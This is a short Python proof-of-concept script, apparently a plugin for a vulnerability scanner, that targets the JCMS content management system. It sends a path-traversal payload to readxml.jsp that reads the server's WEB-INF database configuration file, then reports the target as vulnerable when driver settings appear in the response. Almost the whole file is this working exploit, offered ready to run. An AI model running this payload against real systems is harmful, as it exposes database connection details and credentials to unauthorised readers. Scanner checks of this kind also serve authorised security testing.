#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
POC Name: JCMS DBCONFIG FILE READ
Author  :  kenan
mail    :  2863482451@qq.com
Referer :http://www.wooyun.org/bugs/wooyun-2013-046837
'''
import hackhttp
def run(arg):
     
    payload = "jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
    url = arg + payload
    hh = hackhttp.hackhttp()
    code, head, res, errcode, _ = hh.http(url)
    if code == 200 and '<driver-class>' in res and '<driver-properties>' in res:
        security_hole(url)
